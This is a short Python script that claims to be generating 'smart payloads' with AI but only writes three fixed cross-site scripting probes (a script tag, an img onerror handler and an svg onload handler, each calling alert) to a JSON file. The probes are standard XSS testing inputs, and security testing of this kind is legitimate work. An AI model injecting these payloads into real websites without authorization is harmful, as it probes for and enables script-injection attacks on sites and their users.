import json
print("[AI] Generating smart payloads...")
payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>"
]
with open("payloads.json", "w") as f:
    json.dump(payloads, f)
